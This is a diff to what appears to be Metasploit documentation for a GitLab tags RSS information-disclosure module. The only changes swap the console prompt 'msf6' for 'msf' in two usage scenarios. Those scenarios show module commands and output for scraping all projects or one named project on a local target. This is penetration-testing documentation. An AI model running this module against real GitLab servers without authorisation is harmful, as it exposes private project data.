@@ -32,10 +32,10 @@ like to target, you would need to set that here.
 ## Scenarios
 ### Scrape all Workspaces/Projects
 ```
-msf6 > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
-msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1
+msf > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
+msf auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
+msf auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
 [*] Running module against 127.0.0.1
 
 [+] [2024.02.09-11:18:23] Scraping ALL projects...
@@ -57,11 +57,11 @@ msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
 ```
 ### Specify Project
 ```
-msf6 > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
-msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1     
-msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > set TARGETPROJECT Workspace1/Project1
+msf > use auxiliary/gather/gitlab_tags_rss_info_disclosure 
+msf auxiliary(gather/gitlab_tags_rss_info_disclosure) > set RHOSTS 127.0.0.1     
+msf auxiliary(gather/gitlab_tags_rss_info_disclosure) > set TARGETPROJECT Workspace1/Project1
 TARGETPROJECT => Workspace1/Project1
-msf6 auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
+msf auxiliary(gather/gitlab_tags_rss_info_disclosure) > run
 [*] Running module against 127.0.0.1
 
 [*] [2024.02.09-11:44:43] Check RSS tags feed for: Workspace1/Project1
